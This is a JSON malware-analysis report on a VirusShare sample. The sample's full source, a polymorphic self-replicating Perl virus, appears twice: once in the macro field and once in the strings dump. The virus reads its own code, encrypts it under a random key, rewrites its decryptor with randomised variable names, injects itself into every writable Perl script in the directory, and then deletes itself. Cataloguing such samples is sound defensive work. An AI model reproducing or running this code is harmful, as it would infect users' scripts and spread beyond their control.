{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file",
            "put": "May write to a file",
            "write": "May write to a file"
        },
        "macro": "#!/usr/bin/perl\n# 1st Poly Virus by SnakeByte [Matrix/KryptoCrew]   \nopen(File,$0);@Virus=<File>;close(File);  \t\t# read own code\n$Virus=join(\"\", @Virus);foreach $FileName(<*>) {\t# get files\nif ((-r $FileName) && (-w $FileName) && (-f $FileName)) {\t# check file\nopen(File, \"$FileName\");@Temp=<File>;close(File);\t# open file\nif ((@Temp[0] =~ /perl/i ) && ( substr(@Temp[0],0,2) eq \"\\#!\" )) {\t# perl file ?\nif (( length(@Temp[0]) % 5 ) != 0 ){\t\t\t# already infected ?\n\t\t\t\t\t\t# first we generate a decryptor\n\n$Key = int(rand(255));\t\t\t\t\t# cryptkey\n$crypttype = int(rand(2));\t\t\t\t# how to crypt it ?\n\nfor ( $X = 0; $X < length($Virus); $X++ ){\t\t# Encrypt it\nif ( $crypttype == 0 ){\n@Crypt[$X] = (ord(substr($Virus, $X, 1))) * ($Key);\t# Multiply\n} else {\n@Crypt[$X] = (ord(substr($Virus, $X, 1))) + ($Key);\t# Addition\n}\n}\n\n$connectit = chr(int(rand(25)+65));\n$VirString = join($connectit, @Crypt);\t\t\t# all values get seperated by a !\n$filename  =  chr(int(rand(25)+65));\t\t\t# random filename to put virus to\n$filename .= int(rand(65535));\n if ( int(rand(2)) == 0 ){ \n  @Vir[0] = \"\\$l1l = \\\"$VirString\\\"\\;\";\n  @Vir[1] = \"\\$11l = $Key\\;\";\t\t\t# key to decrypt\n } else {\n  @Vir[0] = \"\\$11l = $Key\\;\";\t\t\t# key to decrypt\n  @Vir[1] = \"\\$l1l = \\\"$VirString\\\"\\;\";\n }\n @Vir[2] = \"\\@ll1 = split(\\\"$connectit\\\", \\$l1l)\\;\";\n @Vir[3] = \"for ( \\$lll = 0\\; \\$lll < (\\@ll1)\\; \\$lll++ ) { \";  # Decrypt Loop\n\n if ( $crypttype == 0 ){\n  @Vir[4] = \" \\$l11 .= chr(\\@ll1[\\$lll] \\/ \\$11l)\\;\"; \t# Decrypt Char\n } else {\n  @Vir[4] = \" \\$l11 .= chr(\\@ll1[\\$lll]-\\$11l)\\;\";\t\t# Decrypt Char\n }\n @Vir[5] = \"}\";\n @Vir[6] = \"open(1l1, \\\">$filename\\\")\\;\";\t\t# write encrypted\n @Vir[7] = \"print 1l1 \\$l11\\;\";\t\t\t# string to a file\n @Vir[8] = \"close(1l1)\\;\";\n @Vir[9] = \"\\$lll = \\`perl $filename\\`;\\n\";\t\t# and start it\n\n\t\t\t\t\t\t# change variables\n\t\t\t\t\t\t# $Virus File @Virus $X  $Key $Vir\n\t\t\t\t\t\t# l1l    1l1  ll1    lll 11l  l11\n@vars = (\"l1l\", \"1l1\", \"ll1\", \"lll\", \"11l\", \"l11\"); # replace the variables\nforeach $replace (@vars){\n $newVar = chr(int(rand(25)+65));\t\t\t# with a letter\n $newVar .= int(rand(65535));\t\t\t# and a random number\n for ( $b=0; $b < @Vir; $b++){\n  @Vir[$b] =~ s/$replace/$newVar/g ;\n }\n}\n\n\ndo {\n  chomp @Temp[0];\n  @Temp[0] .= \" \\n\";\n} until((length(@Temp[0]) % 5) == 0 );\n\n\nopen(File, \">$FileName\");\t\t\t# and write the infected\n$Temp = join(\"\\n\", @Vir);\n\n\nfor ( $X = ( (@Temp) >> 1 ); $X < @Temp; $X++ ){\n  if ( @Temp[$X] =~ \"\\;\\n\" ) {\t\t# insert virus in the middle\n  $Temp2 = join(\"\", @Temp[0..$X]);\t\t# write first part \n  print File $Temp2;\t\t\t# and virus\n  print File $Temp; $X++;\n  $Y = (@Temp);\n  $Temp2 = join(\"\", @Temp[$X..$Y]);\t\t# insert rest of the file\n  print File $Temp2;\n  goto CloseFile;\n }\n}\n\n $Temp2 = join(\"\", @Temp);\t\t\t# no possibility to insert virus\n print File $Temp;\t\t\t\t# file back to disk\n print File $Temp2;\t\t\t\t# without EPO\n\n\nCloseFile:\n close(File);\n}}}}\n\n$a = `rm $0`;  \t\t\t\t# delete our selves..\n"
    },
    "filename": "VirusShare_14d924b7547ae55a8f366b95c7b49a26",
    "filesize": 2987,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "14d924b7547ae55a8f366b95c7b49a26",
        "sha1": "9813aae74adde1a5276ba04708928ad6861e0532",
        "sha256": "4ef2e0af4b3df7e0446cff4e81b72785119b2fd61958d7e6463a967477394b67"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# 1st Poly Virus by SnakeByte [Matrix/KryptoCrew]   ",
            "open(File,$0);@Virus=<File>;close(File);  \t\t# read own code",
            "$Virus=join(\"\", @Virus);foreach $FileName(<*>) {\t# get files",
            "if ((-r $FileName) && (-w $FileName) && (-f $FileName)) {\t# check file",
            "open(File, \"$FileName\");@Temp=<File>;close(File);\t# open file",
            "if ((@Temp[0] =~ /perl/i ) && ( substr(@Temp[0],0,2) eq \"\\#!\" )) {\t# perl file ?",
            "if (( length(@Temp[0]) % 5 ) != 0 ){\t\t\t# already infected ?",
            "\t\t\t\t\t\t# first we generate a decryptor",
            "$Key = int(rand(255));\t\t\t\t\t# cryptkey",
            "$crypttype = int(rand(2));\t\t\t\t# how to crypt it ?",
            "for ( $X = 0; $X < length($Virus); $X++ ){\t\t# Encrypt it",
            "if ( $crypttype == 0 ){",
            "@Crypt[$X] = (ord(substr($Virus, $X, 1))) * ($Key);\t# Multiply",
            "} else {",
            "@Crypt[$X] = (ord(substr($Virus, $X, 1))) + ($Key);\t# Addition",
            "$connectit = chr(int(rand(25)+65));",
            "$VirString = join($connectit, @Crypt);\t\t\t# all values get seperated by a !",
            "$filename  =  chr(int(rand(25)+65));\t\t\t# random filename to put virus to",
            "$filename .= int(rand(65535));",
            " if ( int(rand(2)) == 0 ){ ",
            "  @Vir[0] = \"\\$l1l = \\\"$VirString\\\"\\;\";",
            "  @Vir[1] = \"\\$11l = $Key\\;\";\t\t\t# key to decrypt",
            " } else {",
            "  @Vir[0] = \"\\$11l = $Key\\;\";\t\t\t# key to decrypt",
            "  @Vir[1] = \"\\$l1l = \\\"$VirString\\\"\\;\";",
            " @Vir[2] = \"\\@ll1 = split(\\\"$connectit\\\", \\$l1l)\\;\";",
            " @Vir[3] = \"for ( \\$lll = 0\\; \\$lll < (\\@ll1)\\; \\$lll++ ) { \";  # Decrypt Loop",
            " if ( $crypttype == 0 ){",
            "  @Vir[4] = \" \\$l11 .= chr(\\@ll1[\\$lll] \\/ \\$11l)\\;\"; \t# Decrypt Char",
            " } else {",
            "  @Vir[4] = \" \\$l11 .= chr(\\@ll1[\\$lll]-\\$11l)\\;\";\t\t# Decrypt Char",
            " @Vir[5] = \"}\";",
            " @Vir[6] = \"open(1l1, \\\">$filename\\\")\\;\";\t\t# write encrypted",
            " @Vir[7] = \"print 1l1 \\$l11\\;\";\t\t\t# string to a file",
            " @Vir[8] = \"close(1l1)\\;\";",
            " @Vir[9] = \"\\$lll = \\`perl $filename\\`;\\n\";\t\t# and start it",
            "\t\t\t\t\t\t# change variables",
            "\t\t\t\t\t\t# $Virus File @Virus $X  $Key $Vir",
            "\t\t\t\t\t\t# l1l    1l1  ll1    lll 11l  l11",
            "@vars = (\"l1l\", \"1l1\", \"ll1\", \"lll\", \"11l\", \"l11\"); # replace the variables",
            "foreach $replace (@vars){",
            " $newVar = chr(int(rand(25)+65));\t\t\t# with a letter",
            " $newVar .= int(rand(65535));\t\t\t# and a random number",
            " for ( $b=0; $b < @Vir; $b++){",
            "  @Vir[$b] =~ s/$replace/$newVar/g ;",
            "do {",
            "  chomp @Temp[0];",
            "  @Temp[0] .= \" \\n\";",
            "} until((length(@Temp[0]) % 5) == 0 );",
            "open(File, \">$FileName\");\t\t\t# and write the infected",
            "$Temp = join(\"\\n\", @Vir);",
            "for ( $X = ( (@Temp) >> 1 ); $X < @Temp; $X++ ){",
            "  if ( @Temp[$X] =~ \"\\;\\n\" ) {\t\t# insert virus in the middle",
            "  $Temp2 = join(\"\", @Temp[0..$X]);\t\t# write first part ",
            "  print File $Temp2;\t\t\t# and virus",
            "  print File $Temp; $X++;",
            "  $Y = (@Temp);",
            "  $Temp2 = join(\"\", @Temp[$X..$Y]);\t\t# insert rest of the file",
            "  print File $Temp2;",
            "  goto CloseFile;",
            " $Temp2 = join(\"\", @Temp);\t\t\t# no possibility to insert virus",
            " print File $Temp;\t\t\t\t# file back to disk",
            " print File $Temp2;\t\t\t\t# without EPO",
            "CloseFile:",
            " close(File);",
            "}}}}",
            "$a = `rm $0`;  \t\t\t\t# delete our selves.."
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.285163",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
